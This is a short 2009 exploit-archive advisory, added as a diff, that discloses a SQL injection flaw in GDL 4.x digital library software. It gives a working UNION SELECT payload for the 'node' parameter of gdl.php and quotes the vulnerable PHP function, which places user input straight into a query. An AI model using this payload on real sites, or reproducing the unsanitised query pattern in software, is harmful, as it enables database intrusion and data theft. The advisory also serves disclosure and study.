@@ -1,0 +1,54 @@
+*******************************************************************************************
+   [ Discovered by g4t3w4y \ jkthackerlink[at]gmail.com ]
+   [ transitory only http://jakartaweb.net/home/GDL-Digital-Library-SQL-Injection-Vulnerability.html :) ]
+ ###################################################
+ #  [ GDL v.4.x ]    SQL Injection Vulnerability   #
+ ###################################################
+ #
+ # Script:
+ # GDL 4.0 | htdocs .gz
+ # GDL 4.0 | windows application
+ # GDL 4.2 | htdocs .zip
+ #
+ # Script site: http://kmrg.itb.ac.id
+ # Download: http://kmrg.itb.ac.id
+ #
+ # [SQL] Vuln : http://localhost/gdl.php?mod=browse&node=0+AND+1=2+UNION+SELECT+0,1,2--
+ #
+ # Bug: ./functions/browse.php (line: 286-311)
+ #
+ # function browse_child_list($node)
+ # {
+ #     $strsql = "SELECT folder.*, folder_tree.NODE
+ #                FROM folder, folder_tree
+ #                WHERE
+ #                    folder_tree.PARENT = '$node' AND
+ #                    folder_tree.NODE = folder.NODE ";
+ #   
+ #     $dbres = mysql_query($strsql);               
+ #
+ #    if ($dbres){
+ #            while ($row = mysql_fetch_array($dbres)){                  //  SQL inj
+ #            $html .= browse_folder_print($row,2);
+ #        }       
+ #
+ #         if (!empty($html)){
+ #             $box_html = "<table cellSpacing=0 cellPadding=2 border=0>$html</table>";
+ #             return $box_html;
+ #         } else {
+ #             return NULL;
+ #         }   
+ #     } else {
+ #         stdout_error(mysql_error());
+ #         return NULL;
+ #     }
+ # }
+ ##################################################
+ # Greetz: cozmaster * E-C-H-O Team * and otherz..           #
+ ##################################################
+
+ [ g4t3w4y / 2009 ]
+
+*******************************************************************************************
+
+# milw0rm.com [2009-03-17]
